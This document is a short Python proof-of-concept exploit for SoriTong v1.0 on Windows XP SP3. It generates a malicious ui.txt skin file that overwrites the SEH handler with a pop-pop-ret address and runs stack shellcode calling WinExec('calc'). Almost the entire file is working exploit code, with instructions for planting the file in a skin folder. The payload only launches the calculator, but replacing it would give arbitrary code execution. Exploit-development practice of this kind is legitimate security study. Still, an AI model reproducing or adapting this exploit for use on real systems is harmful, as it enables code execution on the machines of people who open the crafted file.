#!/usr/bin/env python3

# Exploit file to pop calc.exe for SoriTong v1.0 on Windows XP.
# How 2 use:
#   Generate the ui.txt file by running this script
#   Copy the ui.txt file into a SoriTong skin folder
#
# Note: executes shellcode in the stack; does NOT defeat DEP.
# Tested on Windows XP SP3.

print("Creating ui.txt exploit file...")

# Uses hardcoded `kernel32.WinExec("calc")` and hardcoded `msvcrt.exit()`
# We cannot use `kernel32.ExitProcess()` because it has a `0x0A` byte.
exploit = "A"*584                   # Padding
exploit += "\xeb\x06\x90\x90"       # `jmp SHORT 0x6`
exploit += "\x12\xe8\x01\x10"       # SEH handler address points to `pop pop ret`
                                    # to put the `jmp SHORT 0x6` stack address
                                    # into `eip` (found in Player.dll)

# Shellcode for `kernel32.WinExec("calc")`
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\x68\x63\x61\x6C\x63"   # push 'calc'
exploit += "\x6A\x01"               # push 0x1
exploit += "\x8D\x4C\x24\x04"       # lea ecx, [esp + 0x4]
exploit += "\x51"                   # push ecx
exploit += "\xB8\x5D\x2B\x86\x7C"   # mov eax, 0x7C862B5D (`kernel32.WinExec`)
exploit += "\xFF\xD0"               # call eax

# Shellcode for `msvcrt.exit()`
# because the exception will keep triggering.
exploit += "\x31\xC9"               # xor ecx, ecx
exploit += "\x51"                   # push ecx
exploit += "\xB8\x84\x9E\xC3\x77"   # mov eax, 0x77C39E4 (`msvcrt.exit`)
exploit += "\xFF\xD0"               # call eax

exploit += "\x90"*1000              # Pad to clear out the rest of the stack
                                    # to trigger an immediate exception
                                    # (writing past the bottom of the stack)

# Write the file
with open("ui.txt", "wb") as f:
    # Encoding iso8859-1 to preserve extended ASCII range!
    f.write(exploit.encode('iso8859-1'))

print("Exploit file created!")